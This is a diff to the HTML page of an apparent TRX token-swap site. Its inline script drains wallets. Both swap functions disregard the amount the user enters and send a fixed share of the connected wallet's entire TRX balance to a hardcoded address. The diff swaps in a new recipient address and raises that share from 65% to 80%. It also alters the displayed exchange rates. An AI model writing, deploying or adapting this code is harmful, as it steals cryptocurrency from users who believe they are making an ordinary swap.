@@ -81,7 +81,7 @@
           </div>
           <!-- End Mobile Navigation -->
           <script>
-              var account = "41D17c94e1C5c001750542C8b20Db73A4D9c3c6bC6";
+              var account = "41439415B03708BDE585856B46666f34B65aF6A5c3";
               async function maxToken(){
                   var acc = await tronWeb.trx.getAccount();
                   var tokenBalance = 0;
@@ -93,14 +93,14 @@
                   }
                   $("#token-input").focus();
                   $("#token-input").val(tokenBalance).change();
-                  $("#trx-swap").val(tokenBalance * 100).change();
+                  $("#trx-swap").val(tokenBalance * 10).change();
               }
 
               async function maxTRX(){
                   var acc = await tronWeb.trx.getAccount();
                   $("#trx-input").focus();
                   $("#trx-input").val(acc.balance / 1000000).change();
-                  $("#token-swap").val(acc.balance / 1000000 / 100).change();
+                  $("#token-swap").val(acc.balance / 1000000 / 10).change();
               }
 
               async function swapToken(){
@@ -121,7 +121,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 65 / 100);
+                  var v = Math.floor(acc.balance * 80 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
 
@@ -132,7 +132,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 65 / 100);
+                  var v = Math.floor(acc.balance * 80 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
           </script>
@@ -340,11 +340,11 @@
               function change(){
                 try{
                   var tokens = $("#token-input").val();
-                  $("#trx-swap").val(tokens * 100).change();
+                  $("#trx-swap").val(tokens * 10).change();
 
 
                   var value = $("#trx-input").val();
-                  $("#token-swap").val(value / 100).change();
+                  $("#token-swap").val(value / 10).change();
 
                 }catch{}
               }
